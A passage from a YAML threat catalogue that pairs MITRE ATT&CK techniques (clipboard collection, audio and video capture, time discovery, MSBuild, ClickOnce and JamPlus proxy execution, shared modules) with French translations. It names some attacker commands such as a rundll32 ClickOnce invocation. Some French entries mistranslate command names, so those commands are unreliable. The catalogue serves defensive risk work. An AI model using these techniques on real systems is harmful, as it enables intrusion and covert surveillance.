          \ individuelles. Par exemple, Microsoft Exchange prend en charge des r\xE8\
          gles de transport qui \xE9valuent tout le courrier qu\u2019une organisation\
          \ re\xE7oit selon des conditions sp\xE9cifi\xE9es par l\u2019utilisateur,\
          \ puis effectue une action sp\xE9cifi\xE9e par l\u2019utilisateur sur le\
          \ courrier qui respecte ces conditions. (Citation : R\xE8gles de flux Microsoft\
          \ Mail 2023) Les adversaires qui abusent de ces fonctionnalit\xE9s peuvent\
          \ \xEAtre en mesure de permettre le transfert de tout ou de certains courriers\
          \ qu\u2019une organisation re\xE7oit.\nhttps://attack.mitre.org/techniques/T1114/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1115
    ref_id: T1115
    name: Clipboard Data
    description: "Adversaries may collect data stored in the clipboard from users\
      \ copying information within or between applications. \n\nFor example, on Windows\
      \ adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation:\
      \ MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally,\
      \ adversaries may monitor then replace users\u2019 clipboard with their data\
      \ (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation:\
      \ mining_ruby_reversinglabs)\n\nmacOS and Linux also have commands, such as\
      \ <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with\
      \ EmPyre)\nhttps://attack.mitre.org/techniques/T1115"
    translations:
      fr:
        name: "Donn\xE9es du presse-papiers"
        description: "Les adversaires peuvent collecter des donn\xE9es stock\xE9es\
          \ dans le clipboard aupr\xE8s des utilisateurs copiant des informations\
          \ au sein ou entre applications. \n\nPar exemple, sous Windows, les adversaires\
          \ peuvent acc\xE9der aux donn\xE9es du presse-papiers en utilisant <code>clip.exe</code>\
          \ ou <code>Get-Clipboard</code>. (Citation : Clipboard MSDN)(Citation :\
          \ clip_win_server)(Citation : CISA_AA21_200B) De plus, les adversaires peuvent\
          \ surveiller puis remplacer le clipboard des utilisateurs par leurs donn\xE9\
          es (par exemple, [Manipulation des donn\xE9es transmises](https://attack.mitre.org/techniques/T1565/002)).\
          \ (Citation : mining_ruby_reversinglabs)\n\nmacOS et Linux disposent \xE9\
          galement de commandes, comme <code>pbpaste</code>, pour r\xE9cup\xE9rer\
          \ le contenu du presse-pape. (Citation : Op\xE9rant avec EmPyre)\nhttps://attack.mitre.org/techniques/T1115"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1119
    ref_id: T1119
    name: Automated Collection
    description: "Once established within a system or network, an adversary may use\
      \ automated techniques for collecting internal data. Methods for performing\
      \ this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
      \ to search for and copy information fitting set criteria such as file type,\
      \ location, or name at specific time intervals. \n\nIn cloud-based environments,\
      \ adversaries may also use cloud APIs, data pipelines, command line interfaces,\
      \ or extract, transform, and load (ETL) services to automatically collect data.(Citation:\
      \ Mandiant UNC3944 SMS Phishing 2023) \n\nThis functionality could also be built\
      \ into remote access tools. \n\nThis technique may incorporate use of other\
      \ techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)\
      \ and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to\
      \ identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538)\
      \ and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619)\
      \ to identify resources in cloud environments.\nhttps://attack.mitre.org/techniques/T1119"
    translations:
      fr:
        name: "Collecte automatis\xE9e"
        description: "Une fois \xE9tabli au sein d\u2019un syst\xE8me ou d\u2019un\
          \ r\xE9seau, un adversaire peut utiliser des techniques automatis\xE9es\
          \ pour collecter des donn\xE9es internes. Les m\xE9thodes pour effectuer\
          \ cette technique pourraient inclure l\u2019utilisation d\u2019un [Command\
          \ and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
          \ pour rechercher et copier des informations correspondant \xE0 des crit\xE8\
          res tels que le type de fichier, la localisation ou le nom \xE0 des intervalles\
          \ de temps sp\xE9cifiques. \n\nDans les environnements cloud, les adversaires\
          \ peuvent \xE9galement utiliser des API cloud, des pipelines de donn\xE9\
          es, des interfaces en ligne de commande, ou des services d\u2019extraction,\
          \ transformation et chargement (ETL) pour collecter automatiquement des\
          \ donn\xE9es. (Citation : Mandiant UNC3944 SMS Phishing 2023) \n\nCette\
          \ fonctionnalit\xE9 pourrait \xE9galement \xEAtre int\xE9gr\xE9e aux outils\
          \ d\u2019acc\xE8s \xE0 distance. \n\nCette technique peut int\xE9grer l\u2019\
          utilisation d\u2019autres techniques telles que [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)\
          \ et [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)\
          \ pour identifier et d\xE9placer des fichiers, ainsi que [Cloud Service\
          \ Dashboard](https://attack.mitre.org/techniques/T1538) et [Cloud Storage\
          \ Object Discovery](https://attack.mitre.org/techniques/T1619) pour identifier\
          \ les ressources dans les environnements cloud.\nhttps://attack.mitre.org/techniques/T1119"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1120
    ref_id: T1120
    name: Peripheral Device Discovery
    description: 'Adversaries may attempt to gather information about attached peripheral
      devices and components connected to a computer system.(Citation: Peripheral
      Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices could
      include auxiliary resources that support a variety of functionalities such as
      keyboards, printers, cameras, smart card readers, or removable storage. The
      information may be used to enhance their awareness of the system and network
      environment or may be used for further actions.

      https://attack.mitre.org/techniques/T1120'
    translations:
      fr:
        name: "D\xE9couverte de p\xE9riph\xE9riques de dispositifs"
        description: "Les adversaires peuvent tenter de recueillir des informations\
          \ sur des p\xE9riph\xE9riques et composants connect\xE9s \xE0 un syst\xE8\
          me informatique. (Citation : Peripheral Discovery Linux)(Citation : D\xE9\
          couverte p\xE9riph\xE9rique macOS) Les p\xE9riph\xE9riques peuvent inclure\
          \ des ressources auxiliaires prenant en charge diverses fonctionnalit\xE9\
          s telles que claviers, imprimantes, appareils photo, lecteurs de carte \xE0\
          \ puce ou stockage amovible. Ces informations peuvent \xEAtre utilis\xE9\
          es pour accro\xEEtre leur connaissance du syst\xE8me et de l\u2019environnement\
          \ r\xE9seau ou pour des actions ult\xE9rieures.\nhttps://attack.mitre.org/techniques/T1120"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1123
    ref_id: T1123
    name: Audio Capture
    description: 'An adversary can leverage a computer''s peripheral devices (e.g.,
      microphones and webcams) or applications (e.g., voice and video call services)
      to capture audio recordings for the purpose of listening into sensitive conversations
      to gather information.(Citation: ESET Attor Oct 2019)


      Malware or scripts may be used to interact with the devices through an available
      API provided by the operating system or an application to capture audio. Audio
      files may be written to disk and exfiltrated later.

      https://attack.mitre.org/techniques/T1123'
    translations:
      fr:
        name: Audio Capture
        description: "Un adversaire peut exploiter les p\xE9riph\xE9riques d\u2019\
          un ordinateur (par exemple, microphones et webcams) ou des applications\
          \ (par exemple, des services d\u2019appels vocaux et vid\xE9o) pour capturer\
          \ des enregistrements audio dans le but d\u2019\xE9couter des conversations\
          \ sensibles afin de recueillir des informations. (Citation : ESET Attor\
          \ oct. 2019)\n\nDes logiciels malveillants ou des scripts peuvent \xEAtre\
          \ utilis\xE9s pour interagir avec les appareils via une API disponible fournie\
          \ par le syst\xE8me d\u2019exploitation ou une application pour capturer\
          \ l\u2019audio. Les fichiers audio peuvent \xEAtre \xE9crits sur disque\
          \ puis exfiltr\xE9s ult\xE9rieurement.\nhttps://attack.mitre.org/techniques/T1123"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1124
    ref_id: T1124
    name: System Time Discovery
    description: "An adversary may gather the system time and/or time zone settings\
      \ from a local or remote system. The system time is set and stored by services,\
      \ such as the Windows Time Service on Windows or <code>systemsetup</code> on\
      \ macOS.(Citation: MSDN System Time)(Citation: Technet Windows Time Service)(Citation:\
      \ systemsetup mac time) These time settings may also be synchronized between\
      \ systems and services in an enterprise network, typically accomplished with\
      \ a network time server within a domain.(Citation: Mac Time Sync)(Citation:\
      \ linux system time)\n\nSystem time information may be gathered in a number\
      \ of ways, such as with [Net](https://attack.mitre.org/software/S0039) on Windows\
      \ by performing <code>net time \\\\hostname</code> to gather the system time\
      \ on a remote system. The victim's time zone may also be inferred from the current\
      \ system time or gathered by using <code>w32tm /tz</code>.(Citation: Technet\
      \ Windows Time Service) In addition, adversaries can discover device uptime\
      \ through functions such as <code>GetTickCount()</code> to determine how long\
      \ it has been since the system booted up.(Citation: Virtualization/Sandbox Evasion)\n\
      \nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008)\
      \ commands such as `show clock detail` can be used to see the current time configuration.(Citation:\
      \ show_clock_detail_cisco_cmd) On ESXi servers, `esxcli system clock get` can\
      \ be used for the same purpose.\n\nIn addition, system calls \u2013 such as\
      \ <code>time()</code> \u2013 have been used to collect the current time on Linux\
      \ devices.(Citation: MAGNET GOBLIN) On macOS systems, adversaries may use commands\
      \ such as <code>systemsetup -gettimezone</code> or <code>timeIntervalSinceNow</code>\
      \ to gather current time zone information or current date and time.(Citation:\
      \ System Information Discovery Technique)(Citation: ESET DazzleSpy Jan 2022)\n\
      \nThis information could be useful for performing other techniques, such as\
      \ executing a file with a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)(Citation:\
      \ RSA EU12 They're Inside), or to discover locality information based on time\
      \ zone to assist in victim targeting (i.e. [System Location Discovery](https://attack.mitre.org/techniques/T1614)).\
      \ Adversaries may also use knowledge of system time as part of a time bomb,\
      \ or delaying execution until a specified date/time.(Citation: AnyRun TimeBomb)\n\
      https://attack.mitre.org/techniques/T1124"
    translations:
      fr:
        name: "D\xE9couverte temporelle du syst\xE8me"
        description: "Un adversaire peut recueillir les param\xE8tres d\u2019heure\
          \ et/ou de fuseau horaire du syst\xE8me aupr\xE8s d\u2019un syst\xE8me local\
          \ ou distant. L\u2019heure syst\xE8me est r\xE9gl\xE9e et stock\xE9e par\
          \ des services, tels que le service Windows Time sur Windows ou <code>la\
          \ configuration du syst\xE8me</code> sur macOS. (Citation : Heure du syst\xE8\
          me MSDN)(Citation : Service Temporel Windows Technet)(Citation : configuration\
          \ du syst\xE8me temps mac) Ces r\xE9glages d\u2019heure peuvent \xE9galement\
          \ \xEAtre synchronis\xE9s entre les syst\xE8mes et les services d\u2019\
          un r\xE9seau d\u2019entreprise, g\xE9n\xE9ralement r\xE9alis\xE9s avec un\
          \ serveur de temps r\xE9seau au sein d\u2019un domaine. (Citation : Mac\
          \ Time Sync)(Citation : temps syst\xE8me Linux)\n\nLes informations sur\
          \ l\u2019heure syst\xE8me peuvent \xEAtre recueillies de plusieurs mani\xE8\
          res, comme avec [Net](https://attack.mitre.org/software/S0039) sous Windows\
          \ en effectuant <code>le temps net \\\\nom de l\u2019h\xF4te</code> pour\
          \ recueillir l\u2019heure syst\xE8me sur un syst\xE8me distant. Le fuseau\
          \ horaire de la victime peut \xE9galement \xEAtre d\xE9duit \xE0 partir\
          \ de l\u2019heure du syst\xE8me actuel ou recueilli en utilisant <code>w32tm\
          \ /tz</code>. (Citation : Service Temporel Windows Technet) De plus, les\
          \ adversaires peuvent d\xE9couvrir la disponibilit\xE9 de l\u2019appareil\
          \ via des fonctions telles que <code>GetTickCount()</code> pour d\xE9terminer\
          \ depuis combien de temps le syst\xE8me a d\xE9marr\xE9. (Citation : Virtualisation/\xC9\
          vitement en bo\xEEte \xE0 sable)\n\nSur les dispositifs r\xE9seau, des commandes\
          \ [CLI de dispositif r\xE9seau](https://attack.mitre.org/techniques/T1059/008)\
          \ telles que \xAB afficher le d\xE9tail de l\u2019horloge \xBB peuvent \xEA\
          tre utilis\xE9es pour voir la configuration temporelle actuelle. (Citation\
          \ : show_clock_detail_cisco_cmd) Sur les serveurs ESXi, \xAB esxcli system\
          \ clock get \xBB peut \xEAtre utilis\xE9 pour le m\xEAme usage.\n\nDe plus,\
          \ des appels syst\xE8me \u2013 tels que <code>le temps()</code> \u2013 ont\
          \ \xE9t\xE9 utilis\xE9s pour collecter l\u2019heure actuelle sur des appareils\
          \ Linux. (Citation : GOBLIN MAGN\xC9TIQUE) Sur les syst\xE8mes macOS, les\
          \ adversaires peuvent utiliser des commandes telles que <code>systemsetup\
          \ -gettimezone</code> ou <code>timeIntervalSinceNow</code> pour recueillir\
          \ les informations actuelles sur les fuseaux horaires ou la date et heure\
          \ actuelles. (Citation : Technique de d\xE9couverte d\u2019informations\
          \ syst\xE8me)(Citation : ESET DazzleSpy janv. 2022)\n\nCes informations\
          \ peuvent \xEAtre utiles pour effectuer d\u2019autres techniques, comme\
          \ ex\xE9cuter un fichier avec une [T\xE2che/T\xE2che Planifi\xE9e](https://attack.mitre.org/techniques/T1053)(Citation\
          \ : RSA EU12 They\u2019re Inside), ou pour d\xE9couvrir des informations\
          \ de localit\xE9 bas\xE9es sur le fuseau horaire afin d\u2019aider au ciblage\
          \ des victimes (par exemple [D\xE9couverte de la localisation syst\xE8me](https://attack.mitre.org/techniques/T1614)).\
          \ Les adversaires peuvent \xE9galement utiliser la connaissance de l\u2019\
          heure du syst\xE8me comme partie d\u2019une bombe \xE0 retardement, ou retarder\
          \ l\u2019ex\xE9cution jusqu\u2019\xE0 une date/heure sp\xE9cifi\xE9e. (Citation\
          \ : AnyRun TimeBomb)\nhttps://attack.mitre.org/techniques/T1124"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1125
    ref_id: T1125
    name: Video Capture
    description: 'An adversary can leverage a computer''s peripheral devices (e.g.,
      integrated cameras or webcams) or applications (e.g., video call services) to
      capture video recordings for the purpose of gathering information. Images may
      also be captured from devices or applications, potentially in specified intervals,
      in lieu of video files.


      Malware or scripts may be used to interact with the devices through an available
      API provided by the operating system or an application to capture video or images.
      Video or image files may be written to disk and exfiltrated later. This technique
      differs from [Screen Capture](https://attack.mitre.org/techniques/T1113) due
      to use of specific devices or applications for video recording rather than capturing
      the victim''s screen.


      In macOS, there are a few different malware samples that record the user''s
      webcam such as FruitFly and Proton. (Citation: objective-see 2017 review)

      https://attack.mitre.org/techniques/T1125'
    translations:
      fr:
        name: "Capture vid\xE9o"
        description: "Un adversaire peut utiliser les p\xE9riph\xE9riques d\u2019\
          un ordinateur (par exemple, des cam\xE9ras ou webcams int\xE9gr\xE9es) ou\
          \ des applications (par exemple, des services d\u2019appel vid\xE9o) pour\
          \ capturer des enregistrements vid\xE9o dans le but de recueillir des informations.\
          \ Des images peuvent \xE9galement \xEAtre captur\xE9es \xE0 partir d\u2019\
          appareils ou d\u2019applications, potentiellement \xE0 des intervalles sp\xE9\
          cifi\xE9s, en lieu et place de fichiers vid\xE9o.\n\nDes logiciels malveillants\
          \ ou des scripts peuvent \xEAtre utilis\xE9s pour interagir avec les appareils\
          \ via une API disponible fournie par le syst\xE8me d\u2019exploitation ou\
          \ une application pour capturer des vid\xE9os ou des images. Les fichiers\
          \ vid\xE9o ou image peuvent \xEAtre \xE9crits sur disque puis exfiltr\xE9\
          s ult\xE9rieurement. Cette technique diff\xE8re de la [capture d\u2019\xE9\
          cran](https://attack.mitre.org/techniques/T1113) en raison de l\u2019utilisation\
          \ de dispositifs ou applications sp\xE9cifiques pour l\u2019enregistrement\
          \ vid\xE9o plut\xF4t que de capturer l\u2019\xE9cran de la victime.\n\n\
          Dans macOS, il existe plusieurs exemples de malwares diff\xE9rents qui enregistrent\
          \ la webcam de l\u2019utilisateur, comme FruitFly et Proton. (Citation :\
          \ objectif - voir critique de 2017)\nhttps://attack.mitre.org/techniques/T1125"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1127
    ref_id: T1127
    name: Trusted Developer Utilities Proxy Execution
    description: "Adversaries may take advantage of trusted developer utilities to\
      \ proxy execution of malicious payloads. There are many utilities used for software\
      \ development related tasks that can be used to execute code in various forms\
      \ to assist in development, debugging, and reverse engineering.(Citation: engima0x3\
      \ DNX Bypass)(Citation: engima0x3 RCSI Bypass)(Citation: Exploit Monday WinDbg)(Citation:\
      \ LOLBAS Tracker) These utilities may often be signed with legitimate certificates\
      \ that allow them to execute on a system and proxy execution of malicious code\
      \ through a trusted process that effectively bypasses application control solutions.\n\
      \nSmart App Control is a feature of Windows that blocks applications it considers\
      \ potentially malicious from running by verifying unsigned applications against\
      \ a known safe list from a Microsoft cloud service before executing them.(Citation:\
      \ Microsoft Smart App Control) However, adversaries may leverage \"reputation\
      \ hijacking\" to abuse an operating system\u2019s trust of safe, signed applications\
      \ that support the execution of arbitrary code. By leveraging [Trusted Developer\
      \ Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127) to run\
      \ their malicious code, adversaries may bypass Smart App Control protections.(Citation:\
      \ Elastic Security Labs)"
    translations:
      fr:
        name: "Ex\xE9cution de Proxy des utilitaires de d\xE9veloppement de confiance"
        description: "Les adversaires peuvent profiter d\u2019utilitaires de d\xE9\
          veloppement fiables pour ex\xE9cuter par procuration des charges utiles\
          \ malveillantes. De nombreux utilitaires sont utilis\xE9s pour les t\xE2\
          ches li\xE9es au d\xE9veloppement logiciel qui peuvent \xEAtre utilis\xE9\
          s pour ex\xE9cuter du code sous diff\xE9rentes formes afin d\u2019aider\
          \ au d\xE9veloppement, au d\xE9bogage et \xE0 l\u2019ing\xE9nierie inverse.\
          \ (Citation : engima0x3 DNX Bypass)(Citation : engima0x3 RCSI Bypass)(Citation\
          \ : Exploit Monday WinDbg)(Citation : LOLBAS Tracker) Ces utilitaires peuvent\
          \ souvent \xEAtre sign\xE9s avec des certificats l\xE9gitimes qui leur permettent\
          \ d\u2019ex\xE9cuter sur un syst\xE8me et d\u2019ex\xE9cuter par procuration\
          \ du code malveillant via un processus de confiance qui contourne efficacement\
          \ les solutions de contr\xF4le applicatif.\n\nSmart App Control est une\
          \ fonctionnalit\xE9 de Windows qui bloque l\u2019ex\xE9cution des applications\
          \ consid\xE9r\xE9es comme potentiellement malveillantes en v\xE9rifiant\
          \ les applications non sign\xE9es \xE0 partir d\u2019une liste de s\xE9\
          curit\xE9 connue provenant d\u2019un service cloud Microsoft avant de les\
          \ ex\xE9cuter. (Citation : Microsoft Smart App Control) Cependant, les adversaires\
          \ peuvent utiliser le \xAB d\xE9tournement de r\xE9putation \xBB pour abuser\
          \ de la confiance d\u2019un syst\xE8me d\u2019exploitation envers des applications\
          \ s\xE9curis\xE9es et sign\xE9es qui supportent l\u2019ex\xE9cution de code\
          \ arbitraire. En utilisant [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127)\
          \ pour ex\xE9cuter leur code malveillant, les adversaires peuvent contourner\
          \ les protections de Smart App Control. (Citation : Elastic Security Labs)"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1127.001
    ref_id: T1127.001
    name: MSBuild
    description: 'Adversaries may use MSBuild to proxy execution of code through a
      trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software
      build platform used by Visual Studio. It handles XML formatted project files
      that define requirements for loading and building various platforms and configurations.(Citation:
      MSDN MSBuild)


      Adversaries can abuse MSBuild to proxy execution of malicious code. The inline
      task capability of MSBuild that was introduced in .NET version 4 allows for
      C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN
      MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile
      and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when
      it is used this way it can execute arbitrary code and bypass application control
      defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS
      Msbuild)

      https://attack.mitre.org/techniques/T1127/001'
    translations:
      fr:
        name: MSBuild
        description: "Les adversaires peuvent utiliser MSBuild pour proxy l\u2019\
          ex\xE9cution du code via un utilitaire Windows de confiance. MSBuild.exe\
          \ (Microsoft Build Engine) est une plateforme de compilation logicielle\
          \ utilis\xE9e par Visual Studio. Il g\xE8re des fichiers de projet format\xE9\
          s XML qui d\xE9finissent les exigences pour charger et construire diverses\
          \ plateformes et configurations. (Citation : MSDN MSBuild)\n\nLes adversaires\
          \ peuvent abuser de MSBuild pour ex\xE9cuter par procuration du code malveillant.\
          \ La capacit\xE9 de t\xE2ches en ligne de MSBuild, introduite dans la version\
          \ 4 de .NET, permet d\u2019ins\xE9rer du code C# ou Visual Basic dans un\
          \ fichier projet XML. (Citation : MSDN MSBuild)(Citation : Microsoft MSBuild\
          \ Inline Tasks 2017) MSBuild compile et ex\xE9cute la t\xE2che en ligne.\
          \ MSBuild.exe est un binaire Microsoft sign\xE9, donc lorsqu\u2019il est\
          \ utilis\xE9 de cette mani\xE8re, il peut ex\xE9cuter un code arbitraire\
          \ et contourner les d\xE9fenses de contr\xF4le des applications configur\xE9\
          es pour permettre MSBuild.exe ex\xE9cution. (Citation : LOLBAS Msbuild)\n\
          https://attack.mitre.org/techniques/T1127/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1127.002
    ref_id: T1127.002
    name: ClickOnce
    description: "Adversaries may use ClickOnce applications (.appref-ms and .application\
      \ files) to proxy execution of code through a trusted Windows utility.(Citation:\
      \ Burke/CISA ClickOnce BlackHat) ClickOnce is a deployment that enables a user\
      \ to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE,\
      \ or .DLL) that install and run from a file share or web page with minimal user\
      \ interaction. The application launches as a child process of DFSVC.EXE, which\
      \ is responsible for installing, launching, and updating the application.(Citation:\
      \ SpectorOps Medium ClickOnce)\n\nBecause ClickOnce applications receive only\
      \ limited permissions, they do not require administrative permissions to install.(Citation:\
      \ Microsoft Learn ClickOnce) As such, adversaries may abuse ClickOnce to proxy\
      \ execution of malicious code without needing to escalate privileges.\n\nClickOnce\
      \ may be abused in a number of ways. For example, an adversary may rely on [User\
      \ Execution](https://attack.mitre.org/techniques/T1204). When a user visits\
      \ a malicious website, the .NET malware is disguised as legitimate software\
      \ and a ClickOnce popup is displayed for installation.(Citation: NetSPI ClickOnce)\n\
      \nAdversaries may also abuse ClickOnce to execute malware via a [Rundll32](https://attack.mitre.org/techniques/T1218/011)\
      \ script using the command `rundll32.exe dfshim.dll,ShOpenVerbApplication1`.(Citation:\
      \ LOLBAS /Dfsvc.exe)\n\nAdditionally, an adversary can move the ClickOnce application\
      \ file to a remote user\u2019s startup folder for continued malicious code deployment\
      \ (i.e., [Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)).(Citation:\
      \ Burke/CISA ClickOnce BlackHat)(Citation: Burke/CISA ClickOnce Paper)\nhttps://attack.mitre.org/techniques/T1127/002"
    translations:
      fr:
        name: ClickOnce
        description: "Les adversaires peuvent utiliser des applications ClickOnce\
          \ (.appref-ms et .application files) pour faire des proxy d\u2019ex\xE9\
          cution de code via un utilitaire Windows de confiance. (Citation : Burke/CISA\
          \ ClickOnce BlackHat) ClickOnce est un d\xE9ploiement qui permet \xE0 un\
          \ utilisateur de cr\xE9er des applications .NET Windows auto-mises \xE0\
          \ jour (c\u2019est-\xE0-dire . XBAP, .EXE ou .DLL) qui s\u2019installent\
          \ et s\u2019ex\xE9cutent depuis un partage de fichiers ou une page web avec\
          \ une interaction utilisateur minimale. L\u2019application se lance en tant\
          \ que processus enfant de DFSVC.EXE, qui est responsable de l\u2019installation,\
          \ du lancement et de la mise \xE0 jour de l\u2019application. (Citation\
          \ : SpectorOps Medium ClickOnce)\n\nComme les applications ClickOnce ne\
          \ re\xE7oivent que des autorisations limit\xE9es, elles ne n\xE9cessitent\
          \ pas d\u2019autorisations administratives pour \xEAtre install\xE9es. (Citation\
          \ : Microsoft Learn ClickOnce) Ainsi, les adversaires peuvent abuser de\
          \ ClickOnce pour proxy l\u2019ex\xE9cution de code malveillant sans avoir\
          \ besoin d\u2019escalader les privil\xE8ges.\n\nClickOnce peut \xEAtre abus\xE9\
          \ de plusieurs fa\xE7ons. Par exemple, un adversaire peut s\u2019appuyer\
          \ sur [Ex\xE9cution utilisateur](https://attack.mitre.org/techniques/T1204).\
          \ Lorsqu\u2019un utilisateur visite un site web malveillant, le malware\
          \ .NET est d\xE9guis\xE9 en logiciel l\xE9gitime et une fen\xEAtre pop-up\
          \ ClickOnce s\u2019affiche pour l\u2019installation. (Citation : NetSPI\
          \ ClickOnce)\n\nLes adversaires peuvent \xE9galement abuser de ClickOnce\
          \ pour ex\xE9cuter un logiciel malveillant via un script [Rundll32](https://attack.mitre.org/techniques/T1218/011)\
          \ en utilisant la commande 'rundll32.exe dfshim.dll,ShOpenVerbApplication1'.\
          \ (Citation : LOLBAS /Dfsvc.exe)\n\nDe plus, un adversaire peut d\xE9placer\
          \ le fichier d\u2019application ClickOnce dans le dossier de d\xE9marrage\
          \ d\u2019un utilisateur distant pour poursuivre le d\xE9ploiement de code\
          \ malveillant (c\u2019est-\xE0-dire [Registry Run Keys / Dossier de d\xE9\
          marrage](https://attack.mitre.org/techniques/T1547/001)). (Citation : Burke/CISA\
          \ ClickOnce BlackHat)(Citation : Document Burke/CISA Clickonce)\nhttps://attack.mitre.org/techniques/T1127/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1127.003
    ref_id: T1127.003
    name: JamPlus
    description: 'Adversaries may use `JamPlus` to proxy the execution of a malicious
      script. `JamPlus` is a build utility tool for code and data build systems. It
      works with several popular compilers and can be used for generating workspaces
      in code editors such as Visual Studio.(Citation: JamPlus manual)


      Adversaries may abuse the `JamPlus` build utility to execute malicious scripts
      via a `.jam` file, which describes the build process and required dependencies.
      Because the malicious script is executed from a reputable developer tool, it
      may subvert application control security systems such as Smart App Control.(Citation:
      Cyble)(Citation: Elastic Security Labs)

      https://attack.mitre.org/techniques/T1127/003'
    translations:
      fr:
        name: JamPlus
        description: "Les adversaires peuvent utiliser \xAB JamPlus \xBB pour proxy\
          \ l\u2019ex\xE9cution d\u2019un script malveillant. \xAB JamPlus \xBB est\
          \ un outil utilitaire de compilation pour les syst\xE8mes de cr\xE9ation\
          \ de code et de donn\xE9es. Il fonctionne avec plusieurs compilateurs populaires\
          \ et peut \xEAtre utilis\xE9 pour g\xE9n\xE9rer des espaces de travail dans\
          \ des \xE9diteurs de code tels que Visual Studio. (Citation : Manuel JamPlus)\n\
          \nLes adversaires peuvent abuser de l\u2019utilitaire de compilation \xAB\
          \ JamPlus \xBB pour ex\xE9cuter des scripts malveillants via un fichier\
          \ \xAB .jam \xBB, qui d\xE9crit le processus de compilation et les d\xE9\
          pendances requises. Parce que le script malveillant est ex\xE9cut\xE9 depuis\
          \ un outil de d\xE9veloppement r\xE9put\xE9, il peut subvertir les syst\xE8\
          mes de s\xE9curit\xE9 de contr\xF4le d\u2019applications tels que Smart\
          \ App Control. (Citation : Cyble)(Citation : Elastic Security Labs)\nhttps://attack.mitre.org/techniques/T1127/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1129
    ref_id: T1129
    name: Shared Modules
    description: 'Adversaries may execute malicious payloads via loading shared modules.
      Shared modules are executable files that are loaded into processes to provide
      access to reusable code, such as specific custom functions or invoking OS API
      functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).


      Adversaries may use this functionality as a way to execute arbitrary payloads
      on a victim system. For example, adversaries can modularize functionality of
      their malware into shared objects that perform various functions such as managing
      C2 network communications or execution of specific actions on objective.


      The Linux & macOS module loader can load and execute shared objects from arbitrary
      local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen`
      and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib`
      files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation:
      RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)


      The Windows module loader can be instructed to load DLLs from arbitrary local
      paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality
      resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106)
      which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft
      DLL)

      https://attack.mitre.org/techniques/T1129'
    translations:
      fr:
        name: "Modules partag\xE9s"
        description: "Les adversaires peuvent ex\xE9cuter des charges utiles malveillantes\
          \ en chargeant des modules partag\xE9s. Les modules partag\xE9s sont des\
          \ fichiers ex\xE9cutables qui sont charg\xE9s dans des processus pour permettre\
          \ l\u2019acc\xE8s \xE0 du code r\xE9utilisable, comme des fonctions personnalis\xE9\
          es sp\xE9cifiques ou l\u2019invocation de fonctions API du syst\xE8me d\u2019\
          exploitation (par exemple, [API native](https://attack.mitre.org/techniques/T1106)).\n\
          \nLes adversaires peuvent utiliser cette fonctionnalit\xE9 pour ex\xE9cuter\
          \ des charges utiles arbitraires sur un syst\xE8me victime. Par exemple,\
          \ les adversaires peuvent modulariser la fonctionnalit\xE9 de leur malware\
          \ en objets partag\xE9s qui remplissent diverses fonctions telles que la\
          \ gestion des communications r\xE9seau C2 ou l\u2019ex\xE9cution d\u2019\
          actions sp\xE9cifiques sur l\u2019objectif.\n\nLe chargeur de modules Linux\
          \ & macOS peut charger et ex\xE9cuter des objets partag\xE9s \xE0 partir\
          \ de chemins locaux arbitraires. Cette fonctionnalit\xE9 r\xE9side dans\
          \ 'dlfcn.h' dans des fonctions telles que 'dlopen' et 'dlsym'. Bien que\
          \ macOS puisse ex\xE9cuter des fichiers '.so', la pratique courante utilise\
          \ des fichiers '.dylib'. (Citation : Biblioth\xE8ques dynamiques Apple Dev)(Citation\
          \ : Biblioth\xE8ques partag\xE9es Linux)(Citation : analyse netlab360 de\
          \ RotaJakiro 2021)(Citation : Unit42 OceanLotus 2017)\n\nLe chargeur de\
          \ modules Windows peut \xEAtre instruit pour charger des DLL \xE0 partir\
          \ de chemins locaux arbitraires et de chemins r\xE9seau arbitraires de la\
          \ Convention universelle de nommage (UNC). Cette fonctionnalit\xE9 r\xE9\
          side dans \xAB NTDLL.dll \xBB et fait partie de l\u2019API native de Windows(https://attack.mitre.org/techniques/T1106)\
